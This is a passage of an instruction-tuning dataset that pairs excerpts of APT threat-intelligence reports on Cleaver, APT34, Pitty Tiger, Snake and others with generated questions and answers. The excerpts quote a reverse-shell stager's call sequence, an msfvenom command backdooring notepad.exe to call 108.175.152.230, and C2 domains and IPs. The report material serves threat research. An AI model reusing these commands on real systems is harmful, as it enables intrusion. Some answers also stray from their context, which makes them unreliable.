calls:\nkernel32!LoadLibraryA(\"ws2_32\")\nws2_32!WSAStartup(...)\ns = ws2_32!WSASocketA(AF_INET, SOCK_STREAM, ...)\nws2_32!connect(s, { sin_family = AF_INET, sin_port = htons(12345), sin_addr = 108.175.152.230 }, 0x10)\nws2_32!recv(s, &cb, 4, 0)\np = kernel32!VirtualAlloc(NULL, cb, MEM_COMMIT, PAGE_EXECUTE_READWRITE)\nws2_32!recv(s, p, cb, 0)\np()\nThe above is known to be true for Notepad3.exe, Notepad4.exe, and notepad10.exe. NOTEPAD2.EXE doesn't seem to want to run, for reasons we didn't bother to troubleshoot for the bad guys.\nBig Headline: Denouement\nUnfortunately, we never did obtain a sample of the code that might have been downloaded. The key to that enigma-embedded, mystery-wrapped riddle is forever lost to us. The best we can do is read what's written in the Notepads and speculate as to why they exist at all.\nClearly whatever generator created these Notepads is far, far beyond the technical understanding of the Cleaver team. It stands to reason that there is a generator--no chance these were crafted by hand--and that its sophistication is even greater than that of its output. Something like that wouldn't be used only once. Something like that, if this team was able to get ahold of it, must be out there. Turn the right corner of the internet, and you can find anything...\nWell it so happens that we did eventually find it. Some of you have no doubt suspected it all along, and\nnow I'll humbly confirm it for you: the Notepads were, in their entirety, generated by Metasploit. Something along the lines of \"msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe\". The \"msfvenom\" tool transmogrifies a Metasploit payload into a standalone EXE, and with the \"-x\" switch, it'll fuse the payload--encoded as desired--into a copy of an existing executable, exhibiting exactly the behavior we just described. Omne ignotum pro magnifico. Perhaps the more bizarre a thing is, the less mysterious it proves to be.\nHowever, we're still left to wonder what Cleaver was up to when they generated all those Notepads. One conclusion Brian proposed is that they're intended as backdoors--replacements for the legitimate Notepad on a compromised system--which would enable Cleaver to regain access to a system at some indeterminate time in the future, the next time a user runs Notepad. The team demonstrated a similarly intentioned tactic with a connect-back shell scheduled to run in a six-minute window each night; the Notepad replacement, while more intrusive, could be another example of this contingency planning tendency.\nOr maybe the Notepads were only an aborted experiment, attempted and shelved, forgotten in a flurry of compromises and criminal activity. If nothing else, they made for an unexpected bit of mystery.\nQ: What techniques are used in the malicious Notepads to achieve position-independent code execution and how do these techniques work?",
    "output": "The malicious Notepads use a CALL-POP pair to obtain a code address in a position-independent way. This technique involves calling a function and then popping the return address off the stack, which gives the current instruction pointer. This is done instead of using an immediate address value marked with a relocation, which would require modifying the '.reloc' section. Additionally, the code includes a setup for a VirtualAlloc call, which allocates memory with execute permissions, and invokes a function pointer with a hash of the string 'VirtualAlloc'. These techniques allow the code to execute without relying on fixed memory addresses, making it more resilient to changes in the memory layout.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nThe activity described in this blog post presented a well-known Iranian threat actor utilizing their tried-and-true techniques to breach targeted organizations. Luckily, with FireEye's platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new and old malware.\nWe suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security.\nMedium Headline: TONEDEAF\nTONEDEAF is a backdoor that communicates with Command and Control servers using HTTP or DNS. Supported commands include system information collection, file upload, file download, and arbitrary shell command execution. Although this backdoor was coded to be able to communicate with DNS requests to the hard-coded Command and Control server, c[.]cdn-edge-akamai[.]com, it was not configured to use this functionality. Figure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a means for future DNS exfiltration as a plan B.\nAside from not being enabled in this sample, the DNS tunneling functionality also contains missing values and bugs that prevent it from executing properly. One such bug involves determining the length of a command response string without accounting for Unicode strings. As a result, a single command response byte is sent when, for example, the malware executes a shell command that returns Unicode output. Additionally, within the malware, an unused string contained the address 185[.]15[.]247[.]154.\n\nHow does the TONEDEAF backdoor utilized by APT34 communicate with Command and Control servers, and what are some of the supported commands? Additionally, discuss the potential DNS exfiltration functionality and the issues associated with it.",
    "output": "The TONEDEAF backdoor employed by APT34 communicates with Command and Control (C&C) servers using either HTTP or DNS protocols. The supported commands include system information collection, file upload, file download, and arbitrary shell command execution. While the backdoor was designed to communicate via DNS requests to a hard-coded C&C server (c[.]cdn-edge-akamai[.]com), this functionality was not enabled in the observed sample. This suggests that the creators intended it as a backup plan for future DNS exfiltration. However, the DNS tunneling feature contains several issues that prevent it from functioning correctly. One notable bug involves incorrectly determining the length of a command response string without accounting for Unicode strings, resulting in the transmission of a single command response byte for Unicode outputs. Furthermore, the malware includes an unused string containing the IP address 185[.]15[.]247[.]154.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What techniques does the backdoor employ to ensure it remains undetected and functional on the victim's system? How can these techniques be countered by security measures?",
    "output": "The backdoor employs several techniques to remain undetected and functional. It uses DLL search order hijacking or binary planting by replacing a legitimate DLL ('msacm32.drv') with a malicious version that still loads the legitimate DLL to maintain normal functionality. It also contains Poison Ivy RAT shellcode encrypted with a custom cipher and attempts to communicate with an external C2 server using the Poison Ivy binary protocol. If this fails, it reverts to a secondary backdoor using HTTP GET and POST requests to an internal IP address. To counter these techniques, security measures should include monitoring for unusual DLL loading behavior, checking for unexpected registry changes, and analyzing network traffic for signs of C2 communication. Additionally, implementing strict application whitelisting and network segmentation can help prevent the execution and spread of such malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Installation\nThe binary we found was dropped by a malicious Word document. The following alarms are triggered in the sandbox:\nThe shellcode contained in the Word file drops the following file, and executes it:\n- C:\\Documents and Settings\\<User>\\Local Settings\\Temp\\svohost.exe\nThis one drops in turn the following file:\n1\n2 MD5 hash: 0567fd7484efbae502cac279d32ed518\nThis tmp file is then copied to \"C:\\Windows\\system32\\Nwsapagentex.dll\" and registered as a service called \"Nwsapagent\".\nThis malware is a variant of the infamous Gh0st RAT 1 . Our specific sample uses \"ssss0\" instead of the usual \"Gh0st\" header for network communications.\nSmall Headline: Command & Control\nThe commands ID used in the communication protocol have also changed, but the features are quite the same.\nThe configuration is directly embedded in the binary, and deciphered at runtime. Up to 5 c&c servers can be configured, but our sample only had one: \"ey.avstore.com.tw:53\".\n\"EY\" could stand for \"Ernst & Young\". It would not be very surprising, since a lot of different attack groups do use anti-virus vendors or other big company's names to try to look more legitimate. Pitty Tiger is no exception, as detailed later in this report.\nWe also found two c&c binaries, claiming to be versions 2.1 and 2.2 of the Paladin RAT controller. Version 2.1 answers to the \"ssss0\" header, while version 2.2 uses the classical \"Gh0st\" header.\nBig Headline: INFRASTRUCTURE\nOur investigation has focused on three particular c&c servers used by the group. These c&c servers, unlike the other c&cs used by the group, have been misconfigured. Once parsed and dumped, it provided us with more insight.\nWe found several domains used by the Pitty Tiger group, the most interesting ones being detailed in this chapter.\nPitty Tiger, like other APT attackers, often use anti-virus \"familiar names\" when registering domains or creating subdomains. Some examples can be avstore.com.tw, sophos.skypetm.com.tw, symantecs.com.tw, trendmicro.org.tw etc.\nBig Headline: VICTIMS\nMapping the victims of such a targeted campaign is not an easy task.\nWe have found the Pitty Tiger group to be very active against one particular private company from the defense industry and one academic network of a government, , yet we think it was done to be used as a proxy for some of the group's operations.\nWe have also found some connections from other companies to the c&c servers, yet we did not find evidence that they were real victims.\nThese alleged victims do work in different sectors and are located mostly in European countries.\n\uf0b7 1 company from the defense industry;\n\uf0b7 1 company from the energy industry;\n\uf0b7 1 company from the telecommunications industry;\n\uf0b7 1 company specialized in web development.\nIt might be surprising to see a company specialized in web development here, yet it has built websites for interesting potential targets. We suspect Pitty Tiger to use this compromise to spear phish other companies which are in commercial relation with this web development company.\nWe have to mention that we only had access to three of the several attackers' servers. Therefore, we suppose the Pitty Tiger group could have more targets than what we could confirm.\nWe also found a lot of vulnerability scanners launched by the attackers at different targets, yet there was no sign of compromise.\nDuring the course of our investigations, we discovered a RAR archive on the attacker's server containing 5 Word documents and one small C source code. These documents belong to the defense company which has been compromised. According to the name of the files and the general feel of the archive, we do think it was extracted by the attackers to \"show\" someone what kind of data they could get from the compromise of that particular target. The documents were still exhibiting comments from various users, showing it was an ongoing work and not old documents.\nInterestingly enough, we saw a part of these documents appear on Virus-Total, with an additional \"gift\" from the attackers, a payload dropping a malware.\nThere are only two options we can think of here:\n\uf0b7 Someone from the same company has been targeted with this document.\n\uf0b7 Someone from another company has been targeted with this document. This other company could be a partner or competitor.\nSince we were unable to determine the intended use of this specific document, we can only suppose that it could be used to provide commercial advantages to competitors of that company, or used by a foreign state.\nMedium Headline: ATTACKER'S CONNECTIONS TO THE C&C\nWe have been able to get all the RDP connections logs to one c&c server:\nRDP connections from attackers machines to one particular c&c, from beginning of April 2014 to beginning of July 2014\nThese connections are either VPS or dynamic IP addresses, mostly from China.\nA computer named CHMXY-PC connected to the c&c via RDP with IP address 58.61.40.5. The IP is in an ADSL dynamic pool in the Gangzhou area (Guangdong province):\nA few connections to the c&c were done by a computer named TIEWEISHIPC with IP address 27.16.139.143. This IP address belongs to an ADSL dynamic pool in the Wuhan area (Hubei's provincial capital).\nSome connections to the c&c originated from a computer named FLY-THINK with several IP addresses, all located in Fuqing (Fujian province). The IP addresses are in an ADSL dynamic pool:\nMost of the connections to the c&c server were coming from a computer named 50PZ80C1DFDCB8 with several IP addresses. There are 11 IP addresses from Chinese dynamic ADSL ranges: 9 from Fuqing (Fujian province), one from Fuzhou (Fujian's province capital) and one from Nanchang (Jiangxi's province capital). The last one came from a VPS instance located in Los Angeles (California, USA) but purchased by a China based VPS provider XeVPS which belong to the AS38197 (Sun Network Hong Kong Limited).\nIP addresses used by the 50PZ80C-1DFDCB8 machine\nPublic release\nThe two computers FLY-THINK and 50PZ80C-1DFDCB8 have used distinct IP addresses to connect to the c&c, yet some of these IP addresses come from the same IP range:\nWe mapped these RDP connections to have a graphical view:\n\nAnswer this question based on the above context: How does the Pitty Tiger group's malware installation process work, starting from the initial infection vector? Explain the steps involved and the significance of each step.",
    "output": "The Pitty Tiger group's malware installation begins with a malicious Word document that drops a binary file. This file, once executed, drops another file named 'svohost.exe' in the user's temporary directory. The 'svohost.exe' file then drops a temporary file with the MD5 hash 0567fd7484efbae502cac279d32ed518, which is subsequently copied to 'C:\\\\Windows\\\\system32\\\\Nwsapagentex.dll' and registered as a service called 'Nwsapagent'. This malware is identified as a variant of the Gh0st RAT, using a custom header 'ssss0' for network communications instead of the usual 'Gh0st' header.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the LIONTAIL backdoor, used by Scarred Manticore, achieve stealthiness in its operations, especially in terms of URL prefixes and HTTP.sys interaction?",
    "output": "The LIONTAIL backdoor achieves stealthiness by utilizing several techniques. Firstly, it listens on URL prefixes that mimic existing services, such as autodiscover and ews, often adding random dictionary words to blend into legitimate traffic. Secondly, it uses a 'strong wildcard' (+) in the host element of URL prefixes, allowing it to match all possible host names. Additionally, instead of using the HTTP API or IIS, which are commonly monitored by security solutions, the malware interacts directly with the HTTP.sys driver using undocumented IOCTLs. This direct interaction makes it harder to detect as it bypasses typical monitoring mechanisms.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: INTRODUCTION\nBlackEnergy is a popular crimeware (that is, malware designed to automate criminal activities) that is sold in the Russian cyber underground and dates back to as early as 2007. Originally, it was designed as a toolkit for creating botnets for use in conducting  Distributed Denial of Service (DDoS) attacks. Over time, the malware has evolved to support different plugins, which are used to extend its capabilities to provide necessary functions, depending on the purpose of an attack.\nGiven the nature of its toolkit, BlackEnergy has unsurprisingly been used by different gangs for different purposes; some use it for sending spam, others for stealing banking credentials. The most notorious use may be when it was used to conduct cyberattacks against Georgia during the Russo-Georgian confrontation in 2008.\nIn the summer of 2014, BlackEnergy caught our attention when we noticed that samples of it were now tailored to\ntarget Ukrainian government institutions. Though it may be unrelated, it is interesting to note that this change conveniently coincides with the on-going crisis in that country. Related or not, one thing is certain: the actor(s) using these customized BlackEnergy malware are intent on stealing information from the targets. The use of this crimeware in what constitutes as an advance persistent threat (APT) attack is interesting. In 'black operations' (black ops), an important criteria is that the attack should not be attributable - and what provides better plausible deniability than crimeware known to be used by multiple parties?\nIn this paper we focus only on BlackEnergy samples  known to be used specifically by the actors we identify as Quedagh, who seem to have a particular interest in political targets. Special focus will be on the samples that were used in targeted attacks against Ukrainian government organizations earlier this year.\nAnswer this question: How does the evolution of BlackEnergy from a DDoS toolkit to a modular malware with various plugins enhance its effectiveness in advanced persistent threat (APT) attacks?",
    "output": "The evolution of BlackEnergy from a simple DDoS toolkit to a modular malware with various plugins enhances its effectiveness in advanced persistent threat (APT) attacks by allowing it to adapt to different objectives and environments. Initially designed for creating botnets for DDoS attacks, BlackEnergy has expanded its capabilities through plugins that enable functions such as sending spam, stealing banking credentials, and conducting cyberattacks. This modularity allows attackers to customize the malware for specific targets, making it versatile and difficult to detect. For instance, in 2014, customized versions of BlackEnergy were used to target Ukrainian government institutions, demonstrating its adaptability to political and geopolitical contexts. The use of widely available crimeware like BlackEnergy also provides plausible deniability for attackers, making it harder to attribute the attacks to specific actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Rocra campaign compare to other well-known cyber-espionage campaigns like Aurora and Night Dragon in terms of sophistication and longevity? What makes Rocra stand out?",
    "output": "Compared to Aurora and Night Dragon, Rocra is significantly more sophisticated. It involves over 1000 unique files and about 30 different module categories, allowing it to stay undetected for over 5 years while exfiltrating vast amounts of data. Rocra stands out due to its highly personalized approach, where each attack is tailored to the specific victim, and its ability to evade detection by most antivirus products.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Attack Flow\nThe components of the attack span multiple stages. Figure 2 (below) shows the steps involved in the attack.\nStep 1: The DOCX file (\"Rooming List Reservas para 3 Familias.docx\") used in the attack vector downloads the \"1.docx\" (template) from the CnC server\nSteps 2 and 3: The embedded \"Microsoft_Excel_Macro-Enabled_Worsksheet1.xlsm\" file in \"1.docx\" (template) downloads the PowerShell code \"A.txt\" from the CnC server and executes it in memory.\nStep 4: The PowerShell code in \"A.txt\" downloads \"index.mp3\" from the CnC server and saves it as \"index.vbs.\"\nStep 5: Upon execution, \"index.vbs\" creates \"opera.vbs,\" which contains code to execute \"opera.ps1\" created in the next step.\nStep 6: \"index.vbs\" downloads \"1.txt\" and saves it as \"opera.ps1,\" which has obfuscated Revenge RAT in it.\nStep 7: \"opera.vbs\" executes \"opera.ps1.\"\nA detailed analysis of files used during various stages of the attack is provided below.\nBig Headline: The Initial Document\nThe initial document, \"Rooming List Reservas para 3 Familias.docx,\" used as the attack vector is a DOCX file. The document uses a technique known as Dynamic Office Template Injection to bypass security products. This allows the attacker to store the malicious file on a remote server. This technique can evade anti-malware solutions that rely on static detection.\nThe document has the structure shown in Figure 3 (below). The structure contains a file named \"footer.xml.rels.\" The \"target\" fields in the file point to the templates hosted on the CnC server. There are several URLs in the \"target\" fields that point to files \"1.docx\" all the way to \"9.docx\" hosted on the CnC server. Each of the files has the same content (the same SHA-256: 338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9).\nWhen the victim opens the document, one of the templates is downloaded and executed.\nBig Headline: The Template File\nThe template file(\"1.docx\" ... \"9x.docx\") follows the structure shown in Figure 4 (below). The settings.xml in the structure have the \"target\" fields that point to XLSM files, which are present in the \"embeddings'' directory in the structure of the DOCX file.\nThe XLSM files \"Microsoft_Excel_Macro-Enabled_Worksheet.xlsm\" to \"Microsoft_Excel_Macro-Enabled_Worksheet9.xlsm\" have the same contents (same SHA-256: 32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2). When the template file (\"1.docx\" ... \"9x.docx\") is executed by Microsoft Word, it executes one of the XLSM files (\"Microsoft_Excel_Macro-Enabled_Worksheet.xlsm\" to \"Microsoft_Excel_MacroEnabled_Worksheet9.xlsm\").\nBig Headline: The XLSM File\nThe XLSM file follows the structure shown in Figure 5 (below). The structure contains macros in the \"VBAProject.bin\" file. The following screenshot shows the stream containing the macros.\nThere are two important macros present in the BIN file: \"Macro 1\" kills the Microsoft Word process \"winword.exe\" and \"Macro 2\" downloads and executes the PowerShell code present at the URL\n\"hxxp://azulviagens[.]online/A.txt\" in memory.\nFigure 6 (below) shows the contents of \"A.txt.\"\nWhen the PowerShell code in \"A.txt\" is executed, it downloads the contents of \"index.mp3\" and saves it to file the \"index.vbs\" and executes it.\nBig Headline: Opera.ps1\n\"Opera.ps1\" is a highly obfuscated PowerShell script (see Figure 8, below). One thing that catches our eye is the string \"4D 5A,\" which indicates the magic header of a Windows executable.\nAfter de-obfuscating the PowerShell code, we were able to retrieve the Windows executable, which is the Revenge RAT. Below is the description of the Revenge RAT we extracted.\nSimilar PowerShell code was also found hosted on x-root.net, which has also been registered in recent months. Uptycs' EDR capabilities can decode the obfuscated PowerShell code, as shown in the screenshot below (Figure 9).\nMedium Headline: IdGenerator\nThe class IdGenerator shown in Figure 12 (below) is used for creating a unique ID for the victim machine, which the RAT is going to send to the CnC server. A unique string ID is generated by retrieving various system attributes using the methods in the class. Below are some of the methods:\nGetActiveWindow: Get active window or window of the application used by the user\nGetAV: Get the antiviruses installed on the system\nGetCamera: Get information about the camera\nGetCpu: Get CPU information\nGetHardDiskSerialNumber: Get hard disk serial number\nGetIp: Get IP address\nGetSystem: Get processor information\nSendInfo: Concatenate information collected by previous methods into a string \"id\"\n\nAnswer this question based on the above context: What specific techniques are employed by the initial DOCX file to evade anti-malware solutions, and how does the structure of the document facilitate this evasion?",
    "output": "The initial DOCX file, 'Rooming List Reservas para 3 Familias.docx', employs Dynamic Office Template Injection to evade anti-malware solutions. This technique allows the attacker to store the malicious file on a remote server, thereby bypassing static detection methods. The document's structure includes a file named 'footer.xml.rels', which contains 'target' fields pointing to templates hosted on the CnC server. These templates are downloaded and executed when the victim opens the document. By spreading the malicious components across multiple files and using remote servers, the attackers can effectively evade traditional security measures that rely on static analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT1's geographic and industry focus indicate the breadth of its cyber espionage campaign?",
    "output": "APT1's geographic and industry focus indicates the breadth of its cyber espionage campaign through several observations. Firstly, 87% of APT1's victims are headquartered in countries where English is the native language, reflecting the group's proficiency in English. Secondly, APT1 targets a wide range of industries simultaneously, demonstrating significant personnel and technical resources. For instance, in January 2011, APT1 compromised 17 new victims across 10 different industries while maintaining access to previously compromised networks. Additionally, APT1 has targeted industries aligned with China's strategic priorities, including those identified in its 12th Five Year Plan, further highlighting the comprehensive nature of its operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: (or 'how many cool words can you fit into one title')\nAuthors:\nCostin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk\nGlobal Research and Analysis Team, Kaspersky Lab\nOn Feb 12th 2013, FireEye announced the discovery () of an Adobe Reader 0-day exploit which is used to drop a previously unknown, advanced piece of malware. We called this new malware \"ItaDuke\" because it reminded us of Duqu and because of the ancient Italian comments in the shellcode copied from Dante Aligheri's Divine Comedy.\nSince the original announcement, we have observed several new incidents using the same exploit (CVE-2013-0640), some of which were so unusual that we decided to analyze them in depth.\nTogether with our partner CrySyS Lab, we've performed a detailed analysis of these new incidents which indicate a new, previously unknown threat actor. For their analysis, please read . For our analysis, please read below.\nFirst of all, while the fake \"Mandiant\" PDF reports (see ) are just dirty hacks of the original exploit, these newer attacks appear to have been created by a 0-day toolkit that was used to build the original \"Visaform Tukey.pdf\" discovered by FireEye.\nThe new PDF attacks drop fake documents that are shown to the victim if the exploit is successfully executed. The documents refer to a human rights seminar (ASEM) and Ukraine's foreign policy and NATO membership plans:\nDocument used against the Hungarian target\nDocument used against the Belgian target\nThe MD5s for the documents used in this attack are:\n3668b018b4bb080d1875aee346e3650a 88292d7181514fda5390292d73da28d4 3f301758aa3d5d123a9ddbad1890853b 0cdf55626e56ffbf1b198beb4f6ed559 cf5a5239ada9b43592757c0d7bf66169 c03bcb0cde62b3f45b4d772ab635e2b0\naction_plan.pdf (Country: Belgium)\nASEM_seminar.pdf (Country: Hungary)\nEUAG_report.pdf (Country: Luxembourg) report.pdf (Country: Spain)\nEUAG_report.pdf (Country: Belgium)\nThe 2013 Armenian Economic Association.pdf (Country: Belgium)\nThe JavaScript exploit code has been modified since the original attack. For instance, the function named \"oTHERWISE\" was renamed to \"q1w2e3r4t\". The function is later called in the code like this:\nNew exploit:\nvar sCIENZA = q1w2e3r4t(vOLENCI[sHOGG('ODNEDNERp',3329,7937)], gIRARSI);\nOlder (\"Visaform Turkey.pdf\") exploit:\nvar sCIENZA = oTHERWISE (vOLENCI['pRENDENDO'], gIRARSI);\nIn addition, the JS code is now in compressed format, while the original sample had it in plaintext. The reason behind the changes is probably to avoid detection by anti-malware products although this doesn't prevent our product from detecting it heuristically as \"HEUR:Exploit.Script.Generic\".\nThe shellcode contained in the PDF document is similar to that used in the documents carrying the \"Itaduke\" payload, with some differences. For instance, after exploiting the vulnerability, it searches for a specific signature within the PDF file. While the \"Itaduke\" shellcode was looking for \"!H2bYm.Sw@\", the MiniDuke version uses a different signature, \"@34fZ7E*p\\\".\nSignature in the Itaduke PDF file\nSignature in the Miniduke PDF file\nOnce the payload signature is found, it is decrypted with XOR and then decompressed using RtlDecompressBuffer API (LZNT1). The resulting PE file is written to a temporary file and loaded using LoadLibary API.\nThe resulting dynamic library implements the second stage of installation. It contains two binary resources, 101 and 102. Resource 101 is the main backdoor DLL component. It is written to the %AppData% directory and loaded using LoadLibary API. Resource 102 is the decoy PDF document. It is written to the Internet cache directory and then opened using a simple BAT file:\nTASKKILL /F /IM acro*\nThe filenames of the dropped files are hardcoded in their resources.\nBeginning of the resource 101 with its filename\nBeginning of the resource 102 with its filename\nInterestingly, the malware dropper contains the following paths:\n\u25cf \"c:\\src\\dlldropper\\Release\\L2P.pdb\".\n\u25cf \"C:\\src\\hellodll\\Release\\hellodll.pdb\".\nThese paths did not exist in the dropper of original PDF (\"Visaform Turkey.pdf\").\nIf we are to trust the PE headers, the dropper was compiled on Feb 20, 2013:\n'Hungarian' dropper compilation time - \"Feb 20 10:51:16 2013\"\nThe backdoor used in the Hungarian case was compiled on \"Feb 20 10:57:52 2013\", just minutes after the dropper was created.\nPerhaps the most unusual thing about these three new attacks is the malware they drop. In all the analyzed cases, the dropped malware is in the form of a 22,528 bytes DLL file. Parts of the malicious DLL file are encrypted with information related to the system configuration, which ensures it will only work properly on the victim's system. If copied to another computer, the malware will be unable to function successfully.\nThe backdoor is written in \"old school\" assembler and is tiny by current standards - only 20 KB. This is most unusual for modern malware, which can be several megabytes in size. It has a small decryptor at the beginning that decrypts the main body. All three cases use different encryption keys. Another peculiarity is that the backdoor has no imports: all functions are scanned from memory and are called dynamically. It is also interesting that the first two Win32 APIs resolved and called by the unpacking stub are ntdll.LdrLoadDll and kernel32.VirtualProtectEx. These two functions are not called according to the \"_stdcall\" convention. Instead, a 'jmp ebx' instruction is executed after manually building the stack. Clearly some thought went into creating anti-emulation and anti-scanning techniques with this malware.\nRead the text above and answer this question: Why did the authors of the APT report 'themysteryofthepdf0-dayassemblermicrobackdoor' decide to call the new malware 'ItaDuke', and what significance does this name hold in relation to other known malware?",
    "output": "The authors named the new malware 'ItaDuke' because it reminded them of Duqu, another sophisticated piece of malware, and because of the ancient Italian comments in the shellcode that were copied from Dante Alighieri's Divine Comedy. This naming highlights the similarities in complexity and potential origins, suggesting that the creators of ItaDuke might be influenced by or connected to the creators of Duqu.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nMcAfee\u00ae Advanced Threat Research and Anti-Malware Operations teams have discovered another unknown data reconnaissance implant targeting Korean-speaking users. We have named this threat Operation Oceansalt based on its similarity to the earlier malware Seasalt, which is related to earlier Chinese hacking operations. Oceansalt reuses a portion of code from the Seasalt implant (circa 2010) that is linked to the Chinese hacking group Comment Crew. Oceansalt appears to have been part of an operation targeting South Korea, United States, and Canada in a well-focused attack. A variation of this malware has been distributed from two compromised sites in South Korea. (They are currently offline.) Oceansalt appears to be the first stage of an advanced persistent threat. The malware can send system data to a control server and execute commands on infected machines, but we do not yet know its ultimate purpose. The Advanced Threat Research team has not previously described this implant in any of our analyses.\n\nHow does the reuse of code from the Seasalt implant in Operation Oceansalt indicate the potential origin and sophistication of this new threat? What implications does this have for cybersecurity professionals dealing with similar attacks?",
    "output": "A: The reuse of code from the Seasalt implant in Operation Oceansalt suggests a potential link to the Chinese hacking group Comment Crew, known for their sophisticated and targeted attacks. This indicates that Operation Oceansalt is likely part of a well-organized and advanced persistent threat (APT) campaign. The similarity in code implies that the actors behind Oceansalt may have access to the same resources and expertise as those who developed Seasalt. For cybersecurity professionals, this means they need to be aware of the historical tactics, techniques, and procedures (TTPs) associated with Comment Crew and Seasalt to better anticipate and defend against Oceansalt. Understanding the code reuse also highlights the importance of thorough code analysis and attribution in identifying and mitigating advanced threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT group TA459 use Obfuscated Files or Information: Steganography techniques to evade detection in their attacks?",
    "output": "Obfuscated Files or Information: Steganography refers to the techniques used by adversaries to hide data in digital media, making it difficult to detect. In the case of the APT group TA459, they use steganography techniques to hide their malware payloads. Specifically, they use Least Significant Bit (LSB) Steganography to hide the real payloads within Bitmap (BMP) images. These images appear normal in image viewers, but actually contain malicious code. For example, in one of their attacks, the stage 2 payload was PlugX, which was hidden in a BMP image using LSB Steganography. The image was downloaded from a command and control (C&C) server, and once executed, it would beacon back to the C&C server. By using steganography techniques, TA459 is able to evade detection and make it more difficult for security researchers to analyze their malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: OVERVIEW\nOne of the questions which comes up in the months after big security whitepaper disclosures is: where are they now? In other words, what happened to the operators, tools, and infrastructure which was revealed in the reports, blog-posts, and press interviews.\nDid they continue on as before, did they re-build the disclosed infrastructure and tools, did they go away and get jobs in another line of work?\nIn some cases, the disclosure had little, if any impact on the operation. For example, after the McAfee ShadyRAT report in 2011, there was absolutely no change in the attacks from the group behind this. However, when Mandiant released their APT1 report in 2013, there was a noticeable reduction in activity from the group \u2013 and much of the tools and infrastructure has not been seen since.\nIn the September 2010 issue of Foreign Affairs magazine1 , former US Deputy Secretary of Defense William J. Lynn discussed a cyber-attack which happened two years previously on the DoD's classified computer networks. Lynn described how a foreign intelligence agency planted malicious code on the networks with the aim of transferring data to servers under their control.\nThe article included the now oft-quoted phrase 'digital beachhead' to describe what was undoubtedly a significant compromise of US military systems. Further reports in the press2 kept the story alive in 2011, but since then this threat has received remarkably little attention.\nHowever, the operation behind the attacks has continued with little modification to the tools and techniques, in spite of the widespread attention a few years ago. They use highly sophisticated malware tools to maintain persistent access to their targets. These tools can be used for covert communications in a number of different modes, some of which present significant challenges for traditional security technologies to detect.\nThere are some threats which come and go, whilst there are others which are permanent features of the landscape. In this paper, we describe the tools and techniques of one of the most sophisticated and persistent threats we track. We hope this will help victims identify intrusions and understand their need to improve defences. Cyber security is a collaborative effort \u2013 the operation described in this paper again raises the bar for the security community in their efforts to keep up with the attackers in cyber-space\n1 (<http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain>)http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain\n2 (<http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617>)http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617\nBig Headline: SNAKE SAMPLES\nIn total we have collected over 100 unique files related to this espionage toolkit. Many of these were submitted to online malware analysis websites by victims and investigators over several years. In many cases the source country information of the submission is available. These allow us to visualise the distribution of countries where this malware has been seen:\nWhilst this view is likely to only be the tip of the iceberg, it does give us an initial insight into the profile of targets for the Snake operations.\nOther useful visualisations of the operations come from the compile timestamps. Below is shown a table with a count of the number of files in our sample set from recent years. Two samples compiled in late January 2014 show that this activity is ongoing.\nPlotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber-attacks. The creators of the malware operate a working week, just like any other professional. The single sample in our set which was compiled on a Saturday is an outlier, but doesn't alter the conclusion. Similarly, plotting the hour of the day in which the samples were compiled reveals another human pattern \u2013 the working day. This has been adjusted to UTC+4 to show a possible fit to the operators' local time.\n#Samples compiled per day of the week\n#Samples compiled by hour of the day (adjusted to UTC+4)\nBig Headline: USERMODE-CENTRIC ARCHITECTURE\nThe usermode-centric architecture of Snake is known to have been used from 2011 till 2014, with the most recent sample compiled on January 28, 2014.\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that module for the communications.\nOne of the analysed samples exposed multiple debug messages and source control check-in logs. It is not clear why those messages were allowed in the deployed driver - possibly an operational security lapse. However, they give some insight into the internal structure of the source code.\nFor example, the analysed driver gave away the following source file names:\n\u2022 d:\\proj\\cn\\fa64\\common\\loadlib\\common/loadlib_helpers.c\n\u2022 d:\\proj\\cn\\fa64\\common\\loadlib\\win/loadlib.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libunhook.c\n\u2022 d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\ntsystem/libhook.c\n\u2022 